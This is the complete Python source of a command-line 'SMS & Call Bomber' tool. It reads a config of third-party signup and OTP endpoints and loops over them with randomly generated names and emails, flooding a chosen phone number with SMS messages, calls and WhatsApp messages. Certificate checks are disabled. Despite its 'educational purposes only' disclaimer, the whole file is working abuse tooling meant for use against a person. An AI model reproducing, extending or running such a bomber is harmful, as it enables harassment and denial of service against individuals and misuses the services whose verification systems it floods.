#!/usr/bin/env python3

# Coded By Shivam Raj (@BetterCallShiv)
# Disclaimer: This tool is for educational purposes only.
# Use it responsibly and only on phone numbers you own or have explicit permission to test.
# The developer is not responsible for any misuse of this tool.

import json
import time
import requests
import os
import copy
import signal
import sys
import random
import string
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_firstname():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()

def generate_random_lastname():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()

def generate_random_email(firstname, lastname):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com"]
    return f"{firstname.lower()}{lastname.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"


R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
M = "\033[1;35m"
MB = "\x1b[1;48;5;1m"
C = "\033[1;36m"
W = "\033[1;37m"
BO = "\x1b[1;38;5;202m"
K = "\033[1;30m"
LG = "\033[0;37m"
D = "\033[1;34m"
LB = "\033[1;94m"
LM = "\033[1;95m"
LC = "\033[1;96m"
LY = "\033[1;93m"
DY = "\033[0;33m"
DG = "\033[0;32m"
RD = "\033[0;31m"
NW = "\x1b[1;38;5;51m"
RESET = "\033[0m"

debugging = True


class Bomber:
    def __init__(self, config_path, mode):
        self.config_path = config_path
        self.api_data = self.load_api(mode)
        self.last_response = {name: None for name in self.api_data}
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)


    def signal_handler(self, sig, frame):
        print(f"\n{Y}[!] Stopping bomber...{RESET}")
        self.running = False
        sys.exit(0)


    def load_api(self, mode):
        if not os.path.exists(self.config_path):
            raise FileNotFoundError(f"{self.config_path} not found.")
        with open(self.config_path, "r") as f:
            config = json.load(f)
        if "BomBX_API" not in config:
            raise KeyError("'BomBX_API' section missing in config file.")
        apis = config["BomBX_API"]
        if not isinstance(apis, dict):
            raise ValueError("'BomBX_API' must be a dictionary of apis.")
        if mode == "sms":
            return {k: v for k, v in apis.items() if v.get("type") == "sms"}
        elif mode == "call":
            return {k: v for k, v in apis.items() if v.get("type") == "call"}
        elif mode == "whatsapp":
            return {k: v for k, v in apis.items() if v.get("type") == "whatsapp"}
        elif mode == "multi":
            return apis
        else:
            return apis


    def build_cookies(self, api, phone, firstname, lastname, fullname, email):
        raw_cookies = api.get("cookies", {})
        if isinstance(raw_cookies, dict):
            cookies = copy.deepcopy(raw_cookies)
            for k, v in cookies.items():
                if isinstance(v, str):
                    cookies[k] = v.replace("{phone}", phone).replace("{firstname}", firstname).replace("{lastname}", lastname).replace("{fullname}", fullname).replace("{email}", email)
            return cookies
        elif isinstance(raw_cookies, str) and raw_cookies.strip():
            cookie_str = raw_cookies.replace("{phone}", phone).replace("{firstname}", firstname).replace("{lastname}", lastname).replace("{fullname}", fullname).replace("{email}", email)
            cookies = {}
            for part in cookie_str.split(";"):
                part = part.strip()
                if not part or "=" not in part:
                    continue
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()
            return cookies
        return {}


    def send_request(self, api_name, phone):
        api = self.api_data[api_name]
        
        firstname = generate_random_firstname()
        lastname = generate_random_lastname()
        fullname = f"{firstname} {lastname}"
        email = generate_random_email(firstname, lastname)
        
        def replace_vars(s):
            if not isinstance(s, str):
                return s
            return s.replace("{phone}", phone).replace("{firstname}", firstname).replace("{lastname}", lastname).replace("{fullname}", fullname).replace("{email}", email)
            
        url = replace_vars(api["url"])
        method = api.get("method", "GET").upper()
        
        headers = copy.deepcopy(api.get("headers", {}))
        for k, v in headers.items():
            headers[k] = replace_vars(v)
            
        cookies = self.build_cookies(api, phone, firstname, lastname, fullname, email)
        
        raw_data = api.get("data", {})
        if isinstance(raw_data, dict):
            data = copy.deepcopy(raw_data)
            for k, v in data.items():
                data[k] = replace_vars(v)
        elif isinstance(raw_data, str):
            data = replace_vars(raw_data)
        else:
            data = raw_data
        status_msg = "[ERROR]"
        try:
            if method == "GET":
                r = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
            else:
                content_type = headers.get("Content-Type", "").lower()
                if "application/json" in content_type:
                    if isinstance(data, str):
                        try:
                            json_data = json.loads(data)
                            r = requests.post(url, headers=headers, cookies=cookies, json=json_data, timeout=10, verify=False)
                        except json.JSONDecodeError:
                            r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10, verify=False)
                    else:
                        r = requests.post(url, headers=headers, cookies=cookies, json=data, timeout=10, verify=False)
                else:
                    r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10, verify=False)
            status_msg = "[SUCCESS]" if r.status_code in range(200, 300) else "[FAILED]"
            if r.status_code in range(200, 300):
                print(f"{G}[SUCCESS]{RESET} {api_name} -> Status: {r.status_code}")
            else:
                print(f"{R}[FAILED]{RESET} {api_name} -> Status: {r.status_code}")
            if debugging:
                print(f"{C}--- Response for {api_name} ---{RESET}\n{r.text}\n{C}--- End Response ---{RESET}\n")
            if self.last_response.get(api_name) != r.text:
                with open("BomBX-Logs.txt", "a", encoding="utf-8") as f:
                    f.write(
                        f"--- [{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] "
                        f"{status_msg} {api_name} -> Status: {r.status_code} ---\n{r.text}\n--- End Response ---\n\n"
                    )
                self.last_response[api_name] = r.text
        except Exception as e:
            print(f"{R}[ERROR]{RESET} {api_name} -> {e}")
            if debugging:
                with open("BomBX-Logs.txt", "a", encoding="utf-8") as f:
                    f.write(
                        f"--- [{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] "
                        f"{status_msg} {api_name} -> Error: {e}\n--- End Response ---\n\n"
                    )


    def start(self, phone):
        print(f"{G}[*] Bomber Started for {phone}{RESET}")
        print(f"{Y}[!] Press Ctrl+C to stop{RESET}\n")
        last_used = {name: datetime.min for name in self.api_data}
        while self.running:
            try:
                now = datetime.now()
                any_request_sent = False
                for api_name, api in self.api_data.items():
                    if not self.running:
                        break
                    sleep_seconds = api.get("sleep", 0)
                    elapsed = (now - last_used[api_name]).total_seconds()
                    if elapsed >= sleep_seconds:
                        self.send_request(api_name, phone)
                        last_used[api_name] = datetime.now()
                        any_request_sent = True
                        time.sleep(1)
                    else:
                        remaining = sleep_seconds - elapsed
                        print(f"{Y}[WAIT]{RESET} {api_name} sleep for {remaining:.1f}s")
                if not any_request_sent:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.signal_handler(None, None)


def print_banner():
    print(f"{B}     ╔═══════════════════════════╗{RESET}")
    print(f"{B}     ║{G}         BomBX-CLI         {B}║{RESET}")
    print(f"{B}     ║{NW} github.com/BetterCallShiv {B}║{RESET}")
    print(f"{B}     ╚═══════════════════════════╝{RESET}\n")
    print(f"   {MB} A Simple SMS & Call Bomber Tool {RESET}\n")


if __name__ == "__main__":
    try:
        os.system("cls" if os.name == "nt" else "clear")
        print_banner()
        if not os.path.exists("api_config.json"):
            print(f"{R}[ERROR]{RESET} api_config.json not found!")
            print(f"{Y}[INFO]{RESET} Please create api_config.json with your API configurations.")
            sys.exit(1)
        try:
            with open("api_config.json", "r") as f:
                config = json.load(f)
        except json.JSONDecodeError as e:
            print(f"{R}[ERROR]{RESET} Invalid JSON in api_config.json: {e}")
            sys.exit(1)
        except Exception as e:
            print(f"{R}[ERROR]{RESET} Error reading api_config.json: {e}")
            sys.exit(1)
        apis = config.get("BomBX_API", {})
        if not apis:
            print(f"{R}[ERROR]{RESET} No APIs found in configuration file!")
            sys.exit(1)
        sms_apis = [name for name, data in apis.items() if data.get("type") == "sms"]
        call_apis = [name for name, data in apis.items() if data.get("type") == "call"]
        wa_apis = [name for name, data in apis.items() if data.get("type") == "whatsapp"]
        print(f"{Y}Available SMS APIs: {len(sms_apis)}{RESET}")
        print(f"{C}Available Call APIs: {len(call_apis)}{RESET}")
        print(f"{BO}Available WhatsApp APIs: {len(wa_apis)}{RESET}")
        print()
        phone = input(f"{D}Enter Phone Number: {RESET}").strip()
        if not phone:
            print(f"{R}[ERROR]{RESET} Phone number cannot be empty!")
            sys.exit(1)
        print(f"{R}Choose mode:{RESET}")
        print(f"{G}1. SMS only{RESET}")
        print(f"{M}2. Call only{RESET}")
        print(f"{Y}3. WhatsApp only{RESET}")
        print(f"{B}4. SMS, Call & WhatsApp{RESET}")
        choice = input(f"{W}Enter choice (1/2/3/4): {RESET}").strip()
        mode_map = {
            "1": "sms",
            "2": "call",
            "3": "whatsapp",
            "4": "multi"
        }
        mode = mode_map.get(choice, "multi")
        if choice not in mode_map:
            print(f"{Y}[WARNING]{RESET} Invalid choice, using multi mode")
        try:
            bomber = Bomber("api_config.json", mode)
            if not bomber.api_data:
                print(f"{R}[ERROR]{RESET} No APIs available for selected mode!")
                sys.exit(1)
            bomber.start(phone)
        except Exception as e:
            print(f"{R}[ERROR]{RESET} Failed to initialize bomber: {e}")
            sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Exiting...{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[FATAL ERROR]{RESET} {e}")
        sys.exit(1)
